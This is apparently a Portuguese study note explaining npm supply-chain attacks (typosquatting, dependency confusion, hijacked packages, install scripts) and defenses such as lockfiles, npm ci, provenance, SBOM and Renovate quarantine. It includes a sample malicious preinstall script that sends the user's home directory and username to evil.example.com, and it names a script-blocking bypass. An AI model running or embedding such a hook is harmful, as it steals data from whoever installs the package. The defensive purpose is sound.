---
title: "Supply chain e segurança de dependências"
created: 2026-06-24
updated: 2026-06-25
type: concept
fase: magus
status: seedling
publish: true
tags:
  - tooling
  - seguranca
  - supply-chain
  - dependencias
  - magus
  - entrevista
---

# Supply chain e segurança de dependências

> [!abstract] TL;DR
> Quando você roda `npm install`, você não está apenas baixando código — você está concedendo permissão de execução a dezenas de mantenedores que você nunca conheceu, em máquinas onde você tem credenciais salvas. A supply chain de dependências é uma superfície de ataque massiva: typosquatting, dependency confusion, pacotes sequestrados via conta comprometida, e postinstall scripts que exfiltram dados antes mesmo do seu código rodar. As defesas combinam: lockfiles com hashes SHA-512 e installs imutáveis (`npm ci`), `npm audit` + Socket.dev em CI, npm provenance + SLSA para verificar origem de build, `--ignore-scripts` para minimizar execução arbitrária (padrão a partir do npm v12, julho 2026), SBOM para inventário e compliance, e Dependabot/Renovate para manter deps atualizadas sem mergulho manual. Não existe bala de prata; a segurança de supply chain é defesa em profundidade.

---

## O problema que você não vê até ser tarde demais

Imagine que você está revisando um pull request tranquilo — um upgrade de cinco linhas no `package.json`. Um colega atualizou `lodash` de 4.17.20 para 4.17.21. O PR passa em CI, você aprova, e vai almoçar.

O que você não percebeu é que, nessa versão, um postinstall script silencioso lê o arquivo `~/.aws/credentials` e faz um POST para um servidor externo antes mesmo do seu código iniciar.

Esse cenário não é ficção científica. É uma variante fiel do que aconteceu com o pacote `event-stream` em 2018, com o `ua-parser-js` em 2021, e com os ataques "Mini Shai-Hulud" em 2025 e 2026. A supply chain de software é o conjunto de todas as dependências, ferramentas de build, sistemas de CI e repositórios que participam da criação e distribuição do seu produto — e atacar qualquer ponto nessa cadeia pode comprometer todos os consumidores downstream.

O paradoxo central é este: o modelo de confiança do npm é por padrão **transitivo e implícito**. Quando você `npm install` um pacote com 5 dependências diretas, você está instalando silenciosamente tudo o que essas 5 dependências dependem — frequentemente 200 a 800 pacotes. Você confiou explicitamente em 5. Você executou código de 800.

```mermaid
%%{init: {"theme": "base", "themeVariables": {"primaryColor": "#4A90D9", "edgeLabelBackground": "#fff"}}}%%
graph TD
    APP["seu app\n(package.json)"]

    D1["dep direta A"]
    D2["dep direta B"]
    D3["dep direta C"]

    T1["transitiva A.1"]
    T2["transitiva A.2"]
    T3["transitiva B.1"]
    T4["transitiva B.2"]
    T5["transitiva B.3"]
    T6["transitiva C.1"]

    EVIL["💀 pacote malicioso\n(transitivo, invisível)"]

    APP --> D1
    APP --> D2
    APP --> D3

    D1 --> T1
    D1 --> T2
    D2 --> T3
    D2 --> T4
    D2 --> T5
    D3 --> T6
    T4 --> EVIL

    style EVIL fill:#D0021B,color:#fff
    style APP fill:#4A90D9,color:#fff
```

A pergunta não é "meu projeto direto é seguro?" É "algum dos 800 pacotes que eu instalei indiretamente foi comprometido?"

---

## O lockfile como primeira linha de defesa

Antes de falar de ataques sofisticados, a defesa mais simples e mais frequentemente ignorada é usar o lockfile corretamente.

O `package-lock.json` (npm), `yarn.lock` (Yarn) e `pnpm-lock.yaml` (pnpm) fazem mais do que fixar versões. Cada entrada contém um campo `integrity` com um hash SHA-512 da tarball exata que foi baixada:

```json
// package-lock.json — trecho comentado
{
  "name": "meu-projeto",
  "lockfileVersion": 3,
  "requires": true,
  "packages": {
    "node_modules/express": {
      "version": "4.21.2",
      "resolved": "https://registry.npmjs.org/express/-/express-4.21.2.tgz",
      // ↓ Hash SHA-512 da tarball. Se o conteúdo mudar, o hash muda.
      "integrity": "sha512-ALjnFdJ3trkBiPHNv0IxFPYJ+nYMmMm6oJWq7ARkdxWw2vFsXtHpZjixF21Ht0F6UTLspJ5uWNq1oXmkQOng==",
      "dependencies": {
        "accepts": "^1.3.8"
      }
    }
  }
}
```

O hash SHA-512 é calculado sobre o conteúdo binário da tarball. Se um atacante conseguir substituir o conteúdo de `express@4.21.2` no registry após a publicação, o hash muda — e o npm detecta a divergência na próxima instalação.

> [!question]- Então o lockfile me protege completamente?
> Quase. O lockfile com integridade protege contra *adulteração pós-publicação*. O que ele não protege é contra *publicação maliciosa original*: se o atacante já controla a conta do mantenedor, ele publica `express@4.21.3` com código malicioso, o hash SHA-512 é calculado sobre esse conteúdo malicioso e registrado corretamente. O lockfile depois verifica esse hash com sucesso — porque é o hash *correto* do conteúdo malicioso.

### Installs imutáveis: `npm ci` vs `npm install`

```bash
# npm install — permissivo
# Se package-lock.json não existe, cria um.
# Se existe, pode atualizar versões dentro dos ranges permitidos.
# Usado em desenvolvimento local para flexibilidade.
npm install

# npm ci — rigoroso (Continuous Integration)
# Exige package-lock.json — falha se não existe.
# Se package.json e package-lock.json divergem em nome/versão, FALHA.
# Nunca atualiza o lockfile — usa exatamente o que está registrado.
# Apaga node_modules antes de instalar (garante estado limpo).
# Use SEMPRE em CI/CD.
npm ci

# Equivalentes em outros package managers
yarn install --immutable          # Yarn Berry
pnpm install --frozen-lockfile    # pnpm
bun install --frozen-lockfile     # Bun
```

A distinção é crítica em CI: `npm install` pode silenciosamente atualizar uma dependência transitiva para uma versão comprometida que acabou de ser publicada. `npm ci` instala *exatamente* o que está no lockfile — nem mais, nem menos.

> [!warning] Lockfile fora do git
> Um erro surpreendentemente comum: adicionar `package-lock.json` ao `.gitignore`. Isso faz com que cada desenvolvedor e cada pipeline de CI reconstrua o lockfile do zero, resolvendo as versões mais recentes disponíveis — o oposto de determinismo. O lockfile **deve** estar no git para projetos de aplicação.

---

## Os vetores de ataque: como a supply chain é comprometida

### 1. Typosquatting — o pacote que quase tem o nome certo

Typosquatting é publicar um pacote com nome propositalmente similar ao de um pacote popular, esperando que alguém cometa um erro de digitação.

```mermaid
%%{init: {"theme": "base", "themeVariables": {"primaryColor": "#4A90D9"}}}%%
graph LR
    subgraph "Pacotes legítimos populares"
        L1["lodash\n150M downloads/semana"]
        L2["react\n25M downloads/semana"]
        L3["express\n30M downloads/semana"]
    end

    subgraph "Typosquats conhecidos (removidos)"
        T1["lodahs, lodash3, 1odash"]
        T2["reeact, reactt, reacts"]
        T3["expres, expresss, expresso"]
    end

    subgraph "Carga maliciosa típica"
        M1["postinstall script\n→ exfiltra credenciais"]
        M2["crypto miner\n→ usa CPU do servidor"]
        M3["backdoor\n→ acesso remoto"]
    end

    L1 -.->|"erro de digitação"| T1
    L2 -.->|"erro de digitação"| T2
    L3 -.->|"erro de digitação"| T3

    T1 --> M1
    T2 --> M2
    T3 --> M3

    style T1 fill:#D0021B,color:#fff
    style T2 fill:#D0021B,color:#fff
    style T3 fill:#D0021B,color:#fff
    style M1 fill:#F5A623,color:#000
    style M2 fill:#F5A623,color:#000
    style M3 fill:#F5A623,color:#000
```

A defesa mais direta é revisão humana ao adicionar uma nova dependência (`npm install <nome>` — confirme o nome antes de pressionar Enter). Ferramentas como Socket.dev e Snyk fazem análise automática de nomes suspeitos.

### 2. Dependency Confusion — explorar a resolução de registros

Em fevereiro de 2021, o pesquisador Alex Birsan publicou um artigo que gerou pagamentos de bug bounty superiores a US$ 130.000 de empresas como Microsoft, Apple, Uber, Tesla e outras 30+. O ataque, que ele chamou de *dependency confusion*, explorou uma falha arquitetural nos package managers.

O cenário: muitas empresas usam um registry interno privado para pacotes internos (ex: `minha-empresa/utils-internos`). O npm, por padrão, busca pacotes primeiro no registry público (npmjs.com), depois no privado — ou usa proxies que mesclam ambos.

O ataque funciona assim:

```mermaid
%%{init: {"theme": "base", "themeVariables": {"primaryColor": "#4A90D9"}}}%%
sequenceDiagram
    participant DEV as Desenvolvedor
    participant PM as package manager
    participant PUB as registry público (npm)
    participant PRIV as registry privado (empresa)
    participant ATK as Atacante

    Note over ATK: 1. Descobre nome do pacote<br/>interno via GitHub/error logs
    ATK->>PUB: 2. Publica "utils-internos@9.9.9"<br/>(versão mais alta que a interna)

    DEV->>PM: npm install
    PM->>PUB: Busca "utils-internos"
    PUB-->>PM: Encontrou! v9.9.9 (malicioso)
    Note over PM: Versão 9.9.9 > versão interna 1.2.0<br/>package manager escolhe a maior
    PM->>DEV: Instala versão maliciosa do npm público

    Note over DEV: postinstall script executa,<br/>exfiltra dados para servidor do atacante
```

A defesa é fixar o escopo do pacote privado usando `.npmrc` com `@escopo:registry` apontando para o registry interno, e nunca usar nomes de pacotes internos sem escopo (@):

```bash
# .npmrc — fixar resolução de pacotes com escopo
@minha-empresa:registry=https://registry.minha-empresa.com
# Qualquer @minha-empresa/* sempre vai para o registry privado
# Nunca pode ser "confundido" com o npm público
```

**Como o npm decide qual registry consultar?** A regra é simples: se o pacote tem um escopo (`@minha-empresa/`) e o `.npmrc` mapeia esse escopo para um registry específico, aquele registry é consultado *exclusivamente* — sem fallback para o público. Se o pacote *não tem escopo* e a empresa usa um proxy (Artifactory, Nexus, Verdaccio) como registry padrão, o proxy tipicamente faz upstream ao npmjs.org para qualquer pacote que não encontrar localmente. É exatamente aí que o dependency confusion opera: o proxy busca `utils-internos` no público, encontra `v9.9.9` (versão maior que a interna `v1.2.0`) e serve a versão maliciosa. O escopo elimina esse caminho porque o npm nunca consulta o upstream público para um escopo fixado.

```json
// package.json — use sempre @escopo para pacotes internos
{
  "dependencies": {
    "@minha-empresa/utils-internos": "^1.2.0"  // ✓ com escopo
    // "utils-internos": "^1.2.0"               // ✗ sem escopo — vulnerável
  }
}
```

### 3. Pacotes sequestrados — conta de mantenedor comprometida

Em outubro de 2021, o pacote `ua-parser-js` — com mais de 8 milhões de downloads semanais — teve três versões maliciosas publicadas em menos de uma semana. O atacante comprometeu a conta do mantenedor e publicou `0.7.29`, `0.8.0` e `1.0.0` com um script que instalava um cryptominer e um trojan.

Em setembro de 2025, o ataque escalou para um novo patamar com o incidente TanStack (Mini Shai-Hulud): atacantes publicaram 84 versões maliciosas de 42 pacotes TanStack em menos de seis minutos — todos com provenance SLSA Build Level 3 válido da Sigstore. O vetor *não foi* comprometimento de conta npm. O atacante encadeou três técnicas: o padrão "Pwn Request" via `pull_request_target` (que dá permissões do repositório base a PRs de forks), cache poisoning atravessando o limite fork↔base no GitHub Actions, e extração do token OIDC efêmero da memória do runner em tempo de execução. Com o OIDC token em mãos, o atacante publicou os pacotes *de dentro do pipeline legítimo* — com assinatura, provenance e hash todos válidos. Nenhuma credencial npm foi roubada.

> [!danger] O ataque mais difícil de detectar
> Quando um atacante usa a conta legítima do mantenedor, o npm recebe um package com assinatura válida, hash correto, e até provenance de CI verificado. O `npm ci` instala sem reclamar. O `npm audit` não encontra nada. É malicioso por definição, não por comportamento conhecido.

A defesa aqui é a camada de análise comportamental — ferramentas como Socket.dev que analisam o código do pacote antes de você instalar:

```bash
# Socket.dev CLI — análise antes de instalar
socket npm install react

# Resposta: analisa o código de cada dep, não só metadados.
# Detecta: novo postinstall script que não existia na versão anterior,
# chamadas de rede inesperadas, leitura de ~/.ssh ou env vars,
# obfuscação de código.
```

### 4. Postinstall scripts — execução arbitrária em `npm install`

O vetor mais direto de ataque: npm suporta lifecycle scripts que executam automaticamente durante a instalação de qualquer pacote.

```json
// package.json de um pacote malicioso (simplificado)
{
  "name": "pacote-aparentemente-util",
  "version": "1.0.0",
  "scripts": {
    "preinstall": "node -e \"require('https').get('https://evil.example.com/?' + Buffer.from(JSON.stringify({home: require('os').homedir(), user: require('os').userInfo().username})).toString('base64'))\"",
    "postinstall": "node scripts/setup.js"
    // scripts/setup.js pode fazer QUALQUER coisa: ler .env, ssh keys, tokens de git...
  }
}
```

Quando você executa `npm install`, **todos** os lifecycle scripts de **todos** os pacotes instalados executam com as suas permissões de usuário. Não existe sandbox. Não existe prompt de confirmação.

**A mudança histórica do npm v12 (julho 2026):** a partir do npm v12, install scripts são **desabilitados por padrão**. Pacotes que precisam de scripts devem ser explicitamente aprovados via `npm approve-scripts`. Isso é o fim de uma era de execução implícita que durou décadas.

A aprovação é **por projeto**: o `npm approve-scripts` escreve a allowlist no `package.json` do projeto, e esse arquivo deve ser commitado no git para que o CI use as mesmas aprovações que o desenvolvedor local. Aprovar `esbuild` no Projeto A não afeta o Projeto B. Para instalações globais (`npm install -g`), existe o `.npmrc` com `allow-scripts` global, mas isso é exceção — o padrão é sempre por projeto.

Quanto à reaprovação por versão: por padrão, `approve-scripts` registra aprovações com versão fixada (ex: `esbuild@0.21.5`). Quando você atualiza para `esbuild@0.22.0`, a nova versão aparece como *pendente* até que você re-aprove explicitamente — é exatamente esse o ponto: se a nova versão adicionou um postinstall que não existia antes, você precisa revisar e aprovar. Você pode usar `--no-allow-scripts-pin` para aprovar por nome sem versão, mas perde essa garantia de revisão por versão.

```bash
# Antes do npm v12 — proteção manual
# .npmrc ou npm config
npm config set ignore-scripts true
# Equivalente: adicionar ao .npmrc do projeto:
# ignore-scripts=true

# A partir do npm v12 — padrão seguro
# Scripts só executam se explicitamente aprovados:
npm approve-scripts   # lista scripts pendentes de aprovação
npm install           # agora não executa scripts por padrão

# Para pacotes que precisam de scripts (ex: pacotes com native addons):
npm install --allow-scripts=esbuild  # aprova para um pacote específico
```

> [!warning] Phantom Gyp — o bypass do `--ignore-scripts`
> Existe uma técnica chamada "Phantom Gyp": colocar um arquivo `binding.gyp` vazio de 157 bytes dentro do pacote. Isso faz o npm disparar automaticamente o `node-gyp rebuild` para tentar compilar código nativo — mesmo com `--ignore-scripts` ativo. É um ponto cego até o npm v12, que bloqueou essa chamada implícita.

---

## npm audit: o que ele faz e o que não faz

```bash
# Roda uma auditoria de segurança contra o banco de dados Advisory do npm
npm audit

# Saída de exemplo (comentada):
# found 3 vulnerabilities (1 moderate, 2 high)
#
# moderate  severity  Prototype Pollution in lodash
# Package:            lodash
# Patched in:         >=4.17.21
# Dependency of:      meu-app > lodash
# Path:               meu-app > lodash
# More info:          https://npmjs.com/advisories/...
#
# high      severity  Regular Expression Denial of Service in semver
# Package:            semver
# Patched in:         >=5.7.2 or >=6.3.1 or >=7.5.2
# Dependency of:      meu-app > husky > semver    ← TRANSITIVA
# Path:               meu-app > husky > semver
# More info:          https://npmjs.com/advisories/...

# Fix automático — atualiza dentro dos ranges do package.json
npm audit fix

# Fix forçado — pode atualizar major versions (breaking changes!)
npm audit fix --force   # use com cuidado, revise o diff

# Só mostra vulnerabilidades de produção (ignora devDependencies)
npm audit --omit=dev

# Saída em JSON para processar em CI
npm audit --json

# pnpm e yarn equivalentes
pnpm audit
yarn npm audit
```

O `npm audit` faz uma coisa específica: compara as versões de cada dependência no seu `package-lock.json` contra o banco de dados de vulnerabilidades conhecidas do npm (baseado em CVEs + relatórios da comunidade). Ele é rápido, está embutido, e cobre o caso mais comum.

O que ele **não faz**:
- Não detecta pacotes maliciosos recém-publicados (que ainda não têm CVE)
- Não analisa o comportamento do código — só a versão
- Não detecta typosquatting
- Não detecta dependency confusion
- Não avisa sobre pacotes abandonados ou sem mantenedor ativo

Para cobertura mais ampla, Socket.dev e Snyk fazem análise comportamental em tempo real.

```bash
# Socket.dev — análise de comportamento além de CVEs
npx socket scan              # escaneia o projeto atual
npx socket npm install <pkg> # analisa antes de instalar

# Snyk
npx snyk test                # CVEs + análise de código
npx snyk monitor             # registra o projeto para alertas contínuos
```

---

## npm Provenance: de onde veio esse pacote?

O campo `integrity` no lockfile garante que você tem *a tarball correta*. Mas não diz de onde ela veio nem quem a construiu. Isso é o que o **npm provenance** resolve.

Disponível desde outubro de 2023 (GA), o npm provenance conecta criptograficamente um pacote publicado ao commit exato de source code e ao pipeline de CI que o produziu.

```mermaid
%%{init: {"theme": "base", "themeVariables": {"primaryColor": "#4A90D9"}}}%%
sequenceDiagram
    participant GIT as GitHub Actions CI
    participant FULCIO as Sigstore Fulcio CA
    participant REKOR as Sigstore Rekor<br/>(transparency log)
    participant NPM as npm registry
    participant DEV as Desenvolvedor

    Note over GIT: npm publish --provenance
    GIT->>FULCIO: Solicita certificado X.509<br/>com token OIDC do CI job
    FULCIO-->>GIT: Certificado efêmero<br/>(válido por minutos)
    Note over GIT: Assina provenance statement:<br/>{ sha do commit, workflow URL,<br/>hash da tarball }
    GIT->>REKOR: Envia provenance assinada<br/>para log imutável
    REKOR-->>GIT: Confirma entrada no log
    GIT->>NPM: Publica tarball + provenance bundle

    DEV->>NPM: npm audit signatures
    NPM-->>DEV: Verifica: hash da tarball bate?<br/>Assinatura válida? Commit existia?<br/>Rekor registrou?
```

Para publicar com provenance (exige GitHub Actions ou GitLab CI):

```yaml
# .github/workflows/publish.yml
name: Publish package
on:
  push:
    tags: ['v*']
jobs:
  publish:
    runs-on: ubuntu-latest
    permissions:
      contents: read
      id-token: write   # ← necessário para Sigstore/OIDC
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-node@v4
        with:
          node-version: '22'
          registry-url: 'https://registry.npmjs.org'
      - run: npm ci
      - run: npm publish --provenance --access public
        env:
          NODE_AUTH_TOKEN: ${{ secrets.NPM_TOKEN }}
```

Para verificar a provenance de um pacote instalado:

```bash
# Verifica assinaturas E provenance de todas as deps
npm audit signatures

# Saída esperada para pacotes com provenance:
# audited 247 packages
# verified registry signatures
# verified provenance for 89 packages
# 2 packages have no provenance data

# Verificar provenance de um pacote específico no npmjs.com
# Acesse: https://www.npmjs.com/package/react — aba "Security"
# Mostra: commit, workflow, repositório — rastreável até a linha de código
```

### SLSA: framework além do npm

O SLSA (Supply-chain Levels for Software Artifacts, pronunciado "salsa") é um framework criado pelo Google e adotado pela OpenSSF que define quatro níveis de garantia de provenance:

| Nível SLSA | O que garante | npm provenance |
|---|---|---|
| **Build L1** | Provenance existe e é assinada | Satisfeito |
| **Build L2** | Build em serviço hospedado (CI), assinatura verificável | Satisfeito |
| **Build L3** | Ambiente de build hardened, deps de build verificadas | Satisfeito para GitHub Actions |
| **Build L4** | Two-party review, hermetic build | Não coberto ainda |

> [!warning] Provenance não é garantia de código limpo
> Como demonstrado pelo ataque Mini Shai-Hulud em 2026 — onde 84 versões maliciosas foram publicadas com SLSA Build Level 3 válido — provenance diz *qual pipeline produziu o artefato*, não *se esse pipeline estava comprometido ou controlado por um atacante*. SLSA L3 + conta de mantenedor comprometida = provenance maliciosa assinada corretamente. É defesa em profundidade, não bala de prata.

---

## SBOM: o inventário do que está dentro

SBOM (Software Bill of Materials) é uma lista estruturada de todos os componentes de software de um produto — equivalente a uma lista de ingredientes de um alimento industrializado, mas para código.

O npm tem suporte nativo desde v8:

```bash
# Gera SBOM do projeto atual em formato CycloneDX (recomendado)
npm sbom --sbom-format cyclonedx

# Gera em formato SPDX
npm sbom --sbom-format spdx

# Salva para arquivo
npm sbom --sbom-format cyclonedx > sbom.cdx.json

# Escopo: só produção (exclui devDeps)
npm sbom --sbom-format cyclonedx --omit=dev
```

```json
// sbom.cdx.json — estrutura simplificada de um CycloneDX
{
  "bomFormat": "CycloneDX",
  "specVersion": "1.5",
  "metadata": {
    "timestamp": "2026-06-24T00:00:00Z",
    "component": {
      "name": "meu-app",
      "version": "1.0.0",
      "type": "application"
    }
  },
  "components": [
    {
      "type": "library",
      "name": "express",
      "version": "4.21.2",
      "purl": "pkg:npm/express@4.21.2",
      "hashes": [
        { "alg": "SHA-512", "content": "sha512-ALjn..." }
      ],
      "licenses": [{ "license": { "id": "MIT" } }]
    }
    // ... centenas de entradas
  ]
}
```

O SBOM responde perguntas que `npm audit` não consegue: "Tenho algum componente com licença GPL que não deveria estar no produto?" "Consigo provar para um auditor o que exatamente estava no artefato que deployamos em produção?"

Uma limitação importante que a nota precisa ser honesta sobre: **o `npm sbom` não lista OpenSSL nem outras bibliotecas nativas do sistema operacional**. O comando opera sobre o grafo de dependências npm — o que está em `package-lock.json` com `purl: pkg:npm/...`. Bibliotecas como OpenSSL, libssl, ou as dependências nativas que `node-gyp` compila não aparecem no SBOM gerado pelo npm porque elas não são pacotes npm; elas são instaladas pelo gerenciador de pacotes do SO (apt, yum, Alpine apk). Para inventariar libs nativas junto com dependências npm, é necessário complementar com ferramentas de SBOM de sistema (Syft, Trivy, ou cdxgen com suporte a múltiplos ecossistemas), que escaneia tanto o `node_modules` quanto os binários instalados no SO. Em contêineres Docker, uma abordagem comum é gerar o SBOM sobre a imagem final — o que captura o que o apt instalou e o que o npm instalou na mesma varredura.

---

## Dependabot e Renovate: atualizações automatizadas com controle

Manter dependências atualizadas não é apenas conforto — é segurança. A maioria dos pacotes comprometidos por vulnerabilidade tinha versão corrigida disponível há semanas antes do ataque se tornar público.

```mermaid
%%{init: {"theme": "base", "themeVariables": {"primaryColor": "#4A90D9"}}}%%
flowchart LR
    REG["npm registry\n(nova versão)"]

    subgraph DEPENDABOT["Dependabot"]
        D1["Detecta nova versão"]
        D2["Abre PR automático"]
        D3["Mostra changelog + CVEs"]
    end

    subgraph RENOVATE["Renovate"]
        R1["Detecta nova versão"]
        R2["Agrupa em batches\nconfiguráveis"]
        R3["Abre PR com diff\n+ compatibilidade"]
        R4["Auto-merge\npatch/minor (opt-in)"]
    end

    REG -->|"nova versão publicada"| D1
    REG -->|"nova versão publicada"| R1
    D1 --> D2 --> D3
    R1 --> R2 --> R3 --> R4

    subgraph CI["CI valida o PR"]
        CI1["npm ci"]
        CI2["testes"]
        CI3["npm audit"]
        CI4["merge se verde"]
    end

    D3 --> CI
    R4 --> CI
```

**Dependabot** (nativo no GitHub, zero config):

```yaml
# .github/dependabot.yml
version: 2
updates:
  - package-ecosystem: "npm"
    directory: "/"
    schedule:
      interval: "weekly"       # uma varredura por semana
    open-pull-requests-limit: 10
    groups:
      devDependencies:
        dependency-type: "development"  # agrupa devDeps em um único PR
```

**Renovate** (mais configurável, suporta 60+ ecosystems):

```json
// renovate.json
{
  "$schema": "https://docs.renovatebot.com/renovate-schema.json",
  "extends": ["config:recommended"],
  "packageRules": [
    {
      // Auto-merge patches sem revisão manual
      "matchUpdateTypes": ["patch"],
      "automerge": true
    },
    {
      // Agrupa todas as updates de ESLint em um PR
      "matchPackageNames": ["eslint", "/^@eslint/", "/^eslint-/"],
      "groupName": "ESLint"
    }
  ],
  "vulnerabilityAlerts": {
    "enabled": true,
    "labels": ["security"]   // abre PR com label, não espera schedule
  }
}
```

A diferença prática: Dependabot é mais simples, perfeito para projetos GitHub sem necessidade de customização. Renovate é mais poderoso — agrupa PRs para reduzir ruído, suporta auto-merge por tipo de update, e funciona em GitLab, Bitbucket e auto-hosted.

### `minimumReleaseAge`: a quarentena de novas versões

Existe uma janela perigosa entre a publicação de um pacote e a detecção de código malicioso. Typosquats e contas comprometidas tipicamente são identificados em horas ou dias — mas não em segundos. Se o seu Renovate ou Dependabot aplica patches automaticamente assim que são publicados, você está no grupo mais exposto.

O `minimumReleaseAge` do Renovate resolve isso: só propõe ou auto-merge uma versão depois de N dias desde a publicação, dando tempo para a comunidade detectar problemas.

```json
// renovate.json — quarentena de 3 dias para patches automáticos
{
  "$schema": "https://docs.renovatebot.com/renovate-schema.json",
  "extends": ["config:recommended"],
  "packageRules": [
    {
      "matchUpdateTypes": ["patch", "minor"],
      "automerge": true,
      // ↓ Só auto-merge depois de 3 dias de "silêncio" após publicação
      "minimumReleaseAge": "3 days"
    },
    {
      "matchUpdateTypes": ["major"],
      "automerge": false,
      // Major updates: 7 dias de quarentena antes de abrir o PR
      "minimumReleaseAge": "7 days"
    }
  ]
}
```

> [!tip] Trade-off: segurança vs. velocidade de resposta
> Para CVEs críticos com patch disponível, 3 dias de quarentena é frustrante — você quer o fix agora. O equilíbrio padrão recomendado: `minimumReleaseAge: "3 days"` para atualizações regulares + `vulnerabilityAlerts.minimumReleaseAge: "0 days"` (ou simplesmente sobrescrever para alertas de segurança). O Renovate respeita essa distinção via `matchCategories: ["security"]` nos `packageRules`.

---

## pnpm security-by-default: isolamento estrutural

O pnpm tem uma diferença arquitetural importante frente ao npm que afeta supply chain: seu modelo de resolução é **strict by default** — cada pacote só enxerga as dependências que declarou explicitamente.

```
# Estrutura no npm (hoisting tradicional):
node_modules/
  express/
  accepts/        ← transitiva de express, mas acessível por QUALQUER pacote
  lodash/         ← qualquer pacote pode require('lodash') mesmo sem declarar

# Estrutura no pnpm (strict, sem hoisting):
node_modules/
  .pnpm/
    express@4.21.2/node_modules/
      accepts/    ← visível APENAS para express
  express -> .pnpm/express@4.21.2/...  ← symlink para o pacote raiz
  # lodash NÃO aparece em node_modules/ a menos que seu package.json declare
```

Isso importa para supply chain de duas formas:

**1. Fantôme deps bloqueadas**: com npm hoisting, um pacote malicioso pode fazer `require('algum-outro-pacote')` que não declarou como dependência — porque esse pacote está achatado em `node_modules/` e acessível por todos. Isso permite que um pacote mal-intencionado acesse, por exemplo, um módulo de autenticação interno do seu projeto sem declarar dependência dele. Com pnpm strict, o `require` de um pacote não declarado falha com erro de resolução.

> [!warning] O que o pnpm *não* isola
> O isolamento do pnpm é sobre o grafo de módulos Node — o que pode ser `require()`-ado. Ele *não* isola variáveis de ambiente: `process.env` é global no processo Node e qualquer pacote instalado pode lê-lo, independente do package manager. Da mesma forma, `os.homedir()`, `fs.readFile`, acesso à rede e acesso a `~/.ssh` são igualmente acessíveis a qualquer código que execute — o isolamento de sistema operacional exigiria sandbox (ex: deno permissions, ou containers com seccomp). A defesa contra leitura de `process.env` por pacotes maliciosos é `--ignore-scripts` / `npm approve-scripts`, não o modo strict do pnpm.

**2. Superfície reduzida em monorepos**: em workspaces npm, todos os pacotes da repo compartilham o mesmo `node_modules` achatado. No pnpm, cada workspace tem acesso apenas ao que declarou — isolamento real.

```bash
# pnpm: instalar com frozen lockfile (equivale ao npm ci)
pnpm install --frozen-lockfile

# pnpm audit — equivalente ao npm audit
pnpm audit

# pnpm audit com fix automático
pnpm audit --fix

# pnpm: verificar que não há phantom deps (pacotes usados mas não declarados)
pnpm ls --depth 0    # lista apenas deps diretas
```

> [!question]- Devo migrar de npm para pnpm por razões de segurança?
> Depende do contexto. Para monorepos novos ou projetos onde isolamento é prioritário: sim, pnpm strict é uma melhoria estrutural. Para projetos npm existentes com muitas deps que usam phantom deps (padrão infelizmente comum): a migração vai quebrar coisas — e pode não valer o custo imediato. O ganho é real, mas não é gratuito.

---

## npm Trusted Publishing: sem tokens de longa duração

Uma das mudanças de 2024 que passa despercebida mas tem impacto sênior: o **npm Trusted Publishing** (disponível desde outubro 2024, baseado no modelo do PyPI).

O problema com `NPM_TOKEN` clássico em CI: é um token de longa duração, com validade de meses ou anos, armazenado como secret no CI. Se vazar (rotação negligenciada, log de CI exposto, repositório comprometido), um atacante pode publicar qualquer versão de qualquer pacote da sua conta.

O Trusted Publishing elimina o token permanente:

```mermaid
%%{init: {"theme": "base", "themeVariables": {"primaryColor": "#4A90D9"}}}%%
sequenceDiagram
    participant GHA as GitHub Actions
    participant OIDC as GitHub OIDC Provider
    participant NPM as npm registry

    Note over GHA: npm publish (sem NPM_TOKEN)
    GHA->>OIDC: Solicita token OIDC efêmero
    OIDC-->>GHA: JWT assinado com claims:<br/>{ repo, branch, workflow, sha }
    GHA->>NPM: Envia JWT como autenticação
    NPM->>OIDC: Verifica JWT (repositório + workflow permitidos)
    OIDC-->>NPM: Válido
    NPM-->>GHA: Autorizado — publica pacote
    Note over NPM: JWT expira em minutos;<br/>nenhum token permanente existiu
```

Configuração no npmjs.com:
1. No painel do pacote → "Publishing" → "Configure Trusted Publishers"
2. Adicionar: owner/repo do GitHub + nome do workflow que pode publicar

```yaml
# .github/workflows/publish.yml — com Trusted Publishing (sem NPM_TOKEN!)
name: Publish
on:
  push:
    tags: ['v*']
jobs:
  publish:
    runs-on: ubuntu-latest
    permissions:
      contents: read
      id-token: write   # ← permissão para obter token OIDC do GitHub
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-node@v4
        with:
          node-version: '22'
          registry-url: 'https://registry.npmjs.org'
      - run: npm ci
      - run: npm publish --provenance --access public
        # ↑ sem ENV NPM_TOKEN — autenticação via OIDC automaticamente
```

> [!tip] Trusted Publishing + Provenance juntos
> Quando você usa Trusted Publishing, `--provenance` funciona automaticamente com o mesmo token OIDC — você resolve dois problemas com uma configuração: elimina o token permanente E adiciona attestation de build. O JWT efêmero é o mesmo usado para assinar a provenance no Sigstore Fulcio.

---

## Vendoring: quando o registry é o problema

Todas as estratégias anteriores assumem que você ainda vai baixar pacotes do npm em tempo de CI/CD. Mas e quando o problema é justamente a dependência do registro externo?

**Vendoring** é copiar as dependências para dentro do repositório — remover a dependência em tempo de build do registry externo completamente.

```bash
# Estratégia 1: vendor directory manual (pnpm)
pnpm install
# Copia node_modules para o repositório como "vendor"
# Comitar node_modules/ no git (funciona, mas pesado)

# Estratégia 2: pnpm com --virtual-store-dir customizado
pnpm install --virtual-store-dir vendor/.pnpm

# Estratégia 3: npm pack + armazenar tarballs
npm pack lodash@4.17.21              # cria lodash-4.17.21.tgz
# Armazenar tarballs em S3/Artifactory interno
# No .npmrc apontar para o storage interno

# Estratégia 4: registry proxy/mirror interno (Verdaccio, Artifactory, Nexus)
# .npmrc no projeto:
registry=https://artifactory.minha-empresa.com/npm/
# O Artifactory cacheia do npm público, faz scanning interno, e serve localmente
```

**Quando faz sentido vendorizar:**

| Contexto | Vendoring faz sentido? |
|---|---|
| Builds aéreos (air-gapped), sem acesso à internet | **Sim** — única opção |
| Compliance que exige auditoria de cada byte deployado | **Sim** — SBOM + vendor é auditável |
| Startups com CI rápido e dependências bem auditadas | **Não** — overhead não compensa |
| Projetos com 500+ deps transitivas | **Não** — git vira elefante; use mirror interno |
| Ambientes regulados (FIPS, FedRAMP, ISO 27001) | **Sim** — mirror interno pelo menos |

> [!warning] O problema do vendor no git
> Commitar `node_modules/` no git tem um custo escondido: o histórico do repositório explode em tamanho. Um `node_modules` típico tem 50.000-200.000 arquivos. Depois de 6 meses de updates, o `.git` pode ultrapassar 10GB — tornando `git clone` impraticável. A alternativa mais madura é um registry interno (Verdaccio, Artifactory, Nexus) que age como proxy/cache do npm público: builds dependem do servidor interno, que cacheia e faz scanning antes de servir.

```yaml
